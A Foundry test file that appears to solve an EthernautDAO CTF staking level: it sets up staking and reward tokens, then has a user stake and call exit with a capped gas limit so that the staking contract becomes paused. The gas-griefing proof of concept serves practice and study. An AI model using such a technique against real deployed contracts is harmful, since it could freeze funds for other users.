// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@solmate/test/utils/mocks/MockERC20.sol";
import "../../src/ethernautDao/level11/Staking.sol";
import {StakingToken} from "../../src/ethernautDao/level11/StakingToken.sol";
import {RewardToken} from "../../src/ethernautDao/level11/RewardToken.sol";

contract StakingTest is Test {
    Staking staking;
    MockERC20 rewardToken;
    RewardToken rtk;
    StakingToken stk;

    uint256 duration = 7257600; // 3 months

    address alice;

    function setUp() public {
        rewardToken = new MockERC20("Reward", "RW", 18);

        // deploy reward token: Name, Symbol, lpaddress
        rtk = new RewardToken("RewardToken", "RTK", vm.addr(100));

        // add mock erc20 as rewardtoken for RTK (to increase gas)
        rtk.addReward(address(rewardToken), address(this), duration);

        stk = new StakingToken();
        staking = new Staking(address(stk));

        // add reward token
        staking.addReward(address(rtk), address(this), duration);

        rtk.mint(address(this), 100000 ether);
        rtk.approve(address(staking), 10000 ether);

        // notfiy reward amount
        staking.notifyRewardAmount(address(rtk), 1000 ether);

        alice = vm.addr(1);
        vm.prank(alice);
        stk.faucet();
    }

    function testAttack() public {
        vm.startPrank(alice);
        stk.approve(address(staking), 1 ether);
        staking.stake(0.5 ether);

        vm.warp(10000);

        staking.exit{gas: 525000}();

        // contract should be paused,
        assert(staking.paused());
    }
}
